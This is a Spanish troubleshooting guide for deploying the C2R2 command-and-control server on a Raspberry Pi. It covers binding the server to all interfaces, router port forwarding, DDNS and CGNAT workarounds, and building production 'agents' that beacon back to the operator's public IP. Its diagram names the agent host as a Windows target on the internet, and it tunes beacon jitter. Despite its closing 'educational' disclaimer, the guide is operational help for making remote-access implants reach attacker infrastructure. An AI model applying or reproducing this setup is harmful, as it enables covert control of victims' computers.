# Guía de Solución de Problemas - Raspberry Pi y Port Forwarding

##  Problema: "El agente no alcanza el servidor en Raspberry Pi con port forward"

Esta guía resuelve el problema cuando un agente no puede conectarse al servidor C2R2 en una Raspberry Pi con port forwarding configurado en el router.

---

##  Respuesta Rápida

**Sí, debería funcionar.** El problema más común es que el servidor no está escuchando en todas las interfaces de red.

### Solución Rápida (3 pasos)

```bash
# 1. En la Raspberry Pi - Iniciar servidor correctamente
cd c2r2-server
./target/release/c2r2-server --bind 0.0.0.0 --port 4444

# 2. Verificar que escucha en 0.0.0.0 (NO en 127.0.0.1)
sudo netstat -tlnp | grep 4444
# Debe mostrar: 0.0.0.0:4444 (NO 127.0.0.1:4444)

# 3. Construir agente con IP PÚBLICA (no la IP local de la Pi)
cd builder
cargo run --release -- build-agent \
  --name mi-agente \
  --server "TU_IP_PUBLICA:4444" \
  --production
```

---

##  Diagnóstico Completo

### Paso 1: Verificar que el servidor esté corriendo correctamente

En la Raspberry Pi:

```bash
# Ver procesos escuchando en puerto 4444
sudo netstat -tlnp | grep 4444
```

**Salida correcta:**
```
tcp  0  0  0.0.0.0:4444  0.0.0.0:*  LISTEN  12345/c2r2-server
```

**Salida incorrecta (problema):**
```
tcp  0  0  127.0.0.1:4444  0.0.0.0:*  LISTEN  12345/c2r2-server
```

Si aparece `127.0.0.1:4444`, el servidor solo acepta conexiones locales. **Reiniciarlo con `--bind 0.0.0.0`**.

### Paso 2: Verificar firewall de la Raspberry Pi

```bash
# Permitir puerto 4444 en el firewall
sudo ufw allow 4444/tcp

# Verificar reglas
sudo ufw status
```

Debe aparecer:
```
4444/tcp                   ALLOW       Anywhere
```

### Paso 3: Verificar port forwarding en el router

Acceder al panel de administración del router (usualmente http://192.168.1.1):

**Configuración correcta:**
- Puerto Externo: `4444`
- IP Interna: `192.168.1.100` (IP de tu Raspberry Pi)
- Puerto Interno: `4444`
- Protocolo: `TCP`
- Estado: `Activado/Enabled`

### Paso 4: Obtener tu IP pública

```bash
# Desde la Raspberry Pi
curl ifconfig.me
# Ejemplo: 203.0.113.50
```

Anota esta IP - la necesitarás para construir el agente.

### Paso 5: Probar conectividad

**Prueba local (desde la Raspberry Pi):**
```bash
nc -zv localhost 4444
# Debe mostrar: Connection succeeded!
```

**Prueba LAN (desde otra PC en tu red):**
```bash
nc -zv 192.168.1.100 4444
# Debe mostrar: Connection succeeded!
```

**Prueba WAN (desde internet - usa datos móviles):**
```bash
nc -zv 203.0.113.50 4444  # Tu IP pública
# Debe mostrar: Connection succeeded!
```

**O usa un verificador online:**
- https://www.yougetsignal.com/tools/open-ports/
- Ingresa tu IP pública y puerto 4444
- Debe mostrar: "Port 4444 is open"

### Paso 6: Construir el agente correctamente

** IMPORTANTE:** Usa tu **IP PÚBLICA**, NO la IP local de la Raspberry Pi.

```bash
cd builder

#  CORRECTO - con IP pública
cargo run --release -- build-agent \
  --name mi-agente \
  --server "203.0.113.50:4444" \
  --production

#  INCORRECTO - con IP local (solo funciona en LAN)
cargo run --release -- build-agent \
  --name mi-agente \
  --server "192.168.1.100:4444" \
  --production
```

---

##  Problemas Comunes y Soluciones

### Problema 1: El servidor muestra 127.0.0.1:4444

**Causa:** Servidor iniciado sin `--bind 0.0.0.0`

**Solución:**
```bash
# Detener el servidor (Ctrl+C)
# Reiniciar correctamente:
./target/release/c2r2-server --bind 0.0.0.0 --port 4444
```

### Problema 2: Prueba WAN falla pero LAN funciona

**Causa:** Port forwarding mal configurado o ISP bloqueando puerto

**Soluciones:**

1. **Revisar port forwarding:**
   - Verifica que la IP interna sea la de tu Raspberry Pi
   - Verifica que ambos puertos sean 4444
   - Verifica que esté habilitado

2. **Probar otro puerto (ISP podría bloquear 4444):**
   ```bash
   # Usar puerto 8443 en lugar de 4444
   ./c2r2-server --bind 0.0.0.0 --port 8443

   # Actualizar port forwarding en el router a 8443

   # Reconstruir agente con nuevo puerto:
   cargo run --release -- build-agent \
     --name mi-agente-8443 \
     --server "203.0.113.50:8443" \
     --production
   ```

### Problema 3: ¿Estoy detrás de CGNAT?

**Diagnóstico:**
```bash
# En la Raspberry Pi, obtener IP pública
curl ifconfig.me
# Ejemplo: 100.64.10.50

# Comparar con la IP WAN del router (en panel de admin)
# Si son diferentes, estás detrás de CGNAT
```

**Solución:** Contacta a tu ISP para solicitar IP pública (podría tener costo), o usa:
- Servicio de túnel como ngrok
- VPN como WireGuard o Tailscale
- Servidor en VPS en lugar de Raspberry Pi

### Problema 4: IP pública cambia frecuentemente

**Causa:** ISP asigna IP dinámica

**Solución:** Usar Dynamic DNS (DDNS)

```bash
# 1. Registrarse en servicio DDNS gratuito:
#    - No-IP (noip.com)
#    - DuckDNS (duckdns.org)
#    - Dynu (dynu.com)

# 2. Crear hostname (ejemplo: mic2.ddns.net)

# 3. Instalar cliente DDNS en Raspberry Pi
sudo apt install ddclient

# 4. Construir agente con hostname en lugar de IP
cargo run --release -- build-agent \
  --name mi-agente-ddns \
  --server "mic2.ddns.net:4444" \
  --production
```

### Problema 5: Agente se conecta pero se desconecta inmediatamente

**Causas posibles:**

1. **Agente construido con IP incorrecta**
   ```bash
   # Verificar con qué IP se construyó:
   strings mi-agente.exe | grep "C2_SERVER"
   # Debe mostrar tu IP pública, no 127.0.0.1
   ```

2. **Firewall bloqueando tráfico de retorno**
   ```bash
   sudo ufw allow out 4444/tcp
   ```

3. **NAT timeout del router muy agresivo**
   ```bash
   # En el servidor C2, configurar beacon más rápido:
   C2R2 [1]> /beacon 30:20
   # 30 segundos con ±20% jitter
   ```

---

##  Lista de Verificación

Antes de reportar problemas, verifica:

**Raspberry Pi:**
- [ ] Servidor corriendo con `--bind 0.0.0.0`
- [ ] `netstat` muestra `0.0.0.0:4444` (no `127.0.0.1:4444`)
- [ ] UFW permite puerto 4444: `sudo ufw status | grep 4444`
- [ ] Accesible desde LAN: `nc -zv 192.168.1.100 4444`

**Router:**
- [ ] Port forwarding configurado
- [ ] Puerto externo: 4444
- [ ] IP interna: coincide con Raspberry Pi
- [ ] Puerto interno: 4444
- [ ] Protocolo: TCP
- [ ] Regla activada

**Conectividad Externa:**
- [ ] IP pública conocida: `curl ifconfig.me`
- [ ] Puerto accesible desde internet: verificado con https://www.yougetsignal.com/tools/open-ports/
- [ ] No estás detrás de CGNAT

**Agente:**
- [ ] Construido con IP PÚBLICA (no IP local)
- [ ] Construido en modo producción (`--production`)
- [ ] Formato de servidor correcto: `IP:PUERTO` (ejemplo: "203.0.113.50:4444")

---

##  Documentación Completa

Para información más detallada, consulta:

- **[Guía de Configuración para Raspberry Pi](../build/RASPBERRY_PI_SETUP.md)** (inglés) - Guía paso a paso completa
- **[Guía de Despliegue en Red](../build/)** (inglés) - Configuración avanzada y escenarios
- **[Solución de Problemas](./)** (inglés) - Problemas comunes y soluciones

---

##  Entendiendo el Flujo de Conexión

```
┌──────────────┐
│ Agente (WAN) │  Target Windows en internet
└──────┬───────┘
       │ 1. Conectar a IP_PUBLICA:4444
       ▼
┌──────────────┐
│   Internet   │  Red pública
└──────┬───────┘
       │ 2. Enruta a tu IP pública
       ▼
┌──────────────┐
│    Router    │  Port forwarding: 4444 → 192.168.1.100:4444
└──────┬───────┘
       │ 3. Reenvía a Raspberry Pi
       ▼
┌──────────────┐
│ Raspberry Pi │  Servidor en 192.168.1.100:4444
│  (0.0.0.0)   │  Escuchando en todas las interfaces
└──────────────┘
```

**Puntos clave:**
1. Agente debe construirse con **IP PÚBLICA** (203.0.113.50)
2. Router reenvía **publica:4444** → **LAN:4444**
3. Servidor escucha en **0.0.0.0:4444** (todas las interfaces)

---

##  ¿Aún tienes problemas?

1. **Activar modo verbose:**
   ```bash
   ./c2r2-server --bind 0.0.0.0 --port 4444 --verbose
   ```

2. **Revisar logs:**
   ```bash
   tail -f logs/c2r2-session.log
   ```

3. **Probar con netcat simple:**
   ```bash
   # En Raspberry Pi
   nc -l -p 4444

   # Desde internet
   nc TU_IP_PUBLICA 4444

   # Escribir mensajes para probar comunicación bidireccional
   ```

4. **Desde Windows (antes de desplegar agente):**
   ```powershell
   Test-NetConnection -ComputerName 203.0.113.50 -Port 4444
   ```

---

**Última actualización:** Noviembre 2024
**Versión:** 2.0
**Solo para fines educativos y pruebas autorizadas**
